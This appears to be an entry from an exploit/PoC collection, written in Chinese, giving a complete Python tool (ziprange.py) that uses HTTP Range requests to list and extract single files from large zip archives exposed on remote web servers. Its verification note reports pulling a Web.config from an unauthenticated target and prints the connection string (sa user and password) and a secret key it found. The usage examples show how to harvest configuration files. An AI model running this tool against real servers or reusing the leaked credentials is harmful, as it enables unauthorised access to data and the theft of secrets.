# HTTP Range 精准抽取远端 zip 内任意单文件（不下载整包）

- **code**: http-range-精准抽取远端-zip-内任意单文件-不下载整包
- **kind**: script
- **category**: info-leak
- **component**: 通用（IIS/nginx 目录浏览 / 对象存储 / 任何支持 Range 的 HTTP 文件）
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 203.0.113.71（Host: example.com）实测：web.zip 725,906,081B → 37 次 Range/4,646,210B 取回 37891 条目清单；再精准取出 web/Web.config 5215B，回显真实连接串「Data Source=.; Initial Catalog=ng-net; User ID=sa; Password=root;」与 secretKey=7QT682104PE72Zyb581e8o12429QKig7。无需认证。
- **path**: pocs/http-range-精准抽取远端-zip-内任意单文件-不下载整包/ziprange.py
- **tags**: range,zip,源码泄露,目录浏览,取证
- **created_at**: 2026-09-28T23:32:53.845Z
- **found_by**: exploit

## 描述

把一个"只支持 HTTP Range 的远端 zip"包装成 seekable 文件对象交给标准库 zipfile，由 zipfile 自行读 EOCD→中央目录→目标成员 local header→裸 deflate 数据段，实现"只取我要的那个文件"。适用于目录浏览/对象存储暴露巨型压缩包（源码包、数据库备份包、图片包）时低成本取证：725MB 的包只花约 4.6MB 就能列出 37891 个条目并取回任意单文件。注意坑：读到固定长度的"尾部窗口"只能覆盖中央目录末段，按字节序排在前面（如 web.config 的 '.'0x2E 早于 web/ 的 '/'0x2F）的条目必须通过解析 CD 或本工具才能取到。

## 用法

```
python ziprange.py list   <zip_url> <host_header> [out_list.txt]
python ziprange.py get    <zip_url> <host_header> <member> <outfile>
python ziprange.py getmany <zip_url> <host_header> <outdir> <member1> <member2> ...
示例：
python ziprange.py list "http://203.0.113.71/NET%E5%A4%9A%E6%A8%A1%E6%9D%BF/NET%E7%A8%8B%E5%BA%8F%E5%8C%85%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6/web.zip" example.com webzip-list.txt
python ziprange.py getmany "同URL" example.com webzip "web/Web.config" "web/Areas/Web15/Scripts/biconfig.js"
替换 zip_url / host_header / member 即可；141 行，无第三方依赖（只用标准库 io/zipfile/urllib）。
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ziprange.py - 对远端 zip 用 HTTP Range 随机读，按需提取单个成员（不下载整包）。

原理：实现一个 seekable 的 HTTP Range 文件对象，交给标准库 zipfile 使用。
      zipfile 会自行读 EOCD -> 中央目录 -> 目标成员 local header -> 压缩数据段，
      因此不依赖"固定尾部窗口"，CD 中任意位置的成员都能取到。

用法:
  python ziprange.py list <url> <host> [outfile]
  python ziprange.py get  <url> <host> <member> <outfile>
  python ziprange.py getmany <url> <host> <outdir> <member...>
"""
import io, os, sys, time, zipfile, urllib.request

UA = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
      '(KHTML, like Gecko) Chrome/203.0.113.48 Safari/537.36')


class HttpRangeFile(io.RawIOBase):
    def __init__(self, url, host, block=131072):
        self.url, self.host, self.bs = url, host, block
        self.pos = 0
        self._cache = {}
        self.reqs = 0
        self.fetched = 0
        self._last = 0.0
        self.size = self._probe_size()
        print(f'[i] remote size = {self.size} bytes', file=sys.stderr)

    def _throttle(self):
        dt = time.time() - self._last
        if dt < 0.35:                      # <=3 req/s
            time.sleep(0.35 - dt)
        self._last = time.time()

    def _http(self, start, end):
        req = urllib.request.Request(self.url, headers={
            'Range': f'bytes={start}-{end}', 'Host': self.host,
            'User-Agent': UA, 'Accept': '*/*', 'Connection': 'keep-alive'})
        last = None
        for attempt in range(4):
            self._throttle()
            try:
                with urllib.request.urlopen(req, timeout=120) as r:
                    data = r.read()
                self.reqs += 1
                self.fetched += len(data)
                return data
            except Exception as e:  # noqa
                last = e
                time.sleep(1.5 * (attempt + 1))
        raise RuntimeError(f'range {start}-{end} failed: {last}')

    def _probe_size(self):
        req = urllib.request.Request(self.url, headers={
            'Range': 'bytes=0-0', 'Host': self.host, 'User-Agent': UA})
        with urllib.request.urlopen(req, timeout=60) as r:
            cr = r.headers.get('Content-Range')
            if cr and '/' in cr:
                return int(cr.rsplit('/', 1)[1])
            return int(r.headers.get('Content-Length', 0))

    def _block(self, idx):
        if idx in self._cache:
            return self._cache[idx]
        s = idx * self.bs
        e = min(s + self.bs, self.size) - 1
        d = self._http(s, e)
        if len(self._cache) > 8:
            self._cache.clear()
        self._cache[idx] = d
        return d

    # --- io API ---
    def read(self, n=-1):
        if n is None or n < 0:
            n = self.size - self.pos
        out = []
        while n > 0 and self.pos < self.size:
            idx, off = divmod(self.pos, self.bs)
            blk = self._block(idx)
            if off >= len(blk):
                break
            take = min(n, len(blk) - off)
            out.append(blk[off:off + take])
            self.pos += take
            n -= take
        return b''.join(out)

    def readinto(self, b):
        d = self.read(len(b))
        b[:len(d)] = d
        return len(d)

    def seek(self, off, whence=0):
        if whence == 0:
            self.pos = off
        elif whence == 1:
            self.pos += off
        elif whence == 2:
            self.pos = self.size + off
        self.pos = max(0, min(self.pos, self.size))
        return self.pos

    def tell(self):
        return self.pos

    def seekable(self):
        return True

    def readable(self):
        return True

    def writable(self):
        return False


def open_remote(url, host):
    return HttpRangeFile(url, host)


def main():
    if len(sys.argv) < 4:
        print(__doc__)
        return 2
    mode, url, host = sys.argv[1], sys.argv[2], sys.argv[3]
    rf = open_remote(url, host)
    z = zipfile.ZipFile(rf)

    if mode == 'list':
        out = sys.argv[4] if len(sys.argv) > 4 else None
        lines = [f'{i.file_size:>12} {i.compress_size:>12} {i.filename}' for i in z.infolist()]
        blob = '\n'.join(lines)
        if out:
            with open(out, 'w', encoding='utf-8') as f:
                f.write(blob + '\n')
            print(f'[+] {len(lines)} entries -> {out}', file=sys.stderr)
        else:
            print(blob)
        print(f'[i] CD read: {rf.reqs} range requests, {rf.fetched} bytes fetched', file=sys.stderr)
        return 0

    if mode == 'get':
        member, outfile = sys.argv[4], sys.argv[5]
        data = z.read(member)
        os.makedirs(os.path.dirname(os.path.abspath(outfile)), exist_ok=True)
        with open(outfile, 'wb') as f:
            f.write(data)
        print(f'[+] {member} -> {outfile} ({len(data)} bytes)', file=sys.stderr)
        print(f'[i] {rf.reqs} range requests, {rf.fetched} bytes fetched', file=sys.stderr)
        return 0

    if mode == 'getmany':
        outdir = sys.argv[4]
        for member in sys.argv[5:]:
            try:
                data = z.read(member)
            except KeyError:
                print(f'[-] not found: {member}', file=sys.stderr)
                continue
            safe = member.replace('\\', '/').lstrip('/').replace(':', '_')
            outfile = os.path.join(outdir, safe)
            os.makedirs(os.path.dirname(os.path.abspath(outfile)), exist_ok=True)
            with open(outfile, 'wb') as f:
                f.write(data)
            print(f'[+] {member} -> {outfile} ({len(data)} bytes)', file=sys.stderr)
        print(f'[i] {rf.reqs} range requests, {rf.fetched} bytes fetched', file=sys.stderr)
        return 0

    print('unknown mode', file=sys.stderr)
    return 2


if __name__ == '__main__':
    sys.exit(main())

```
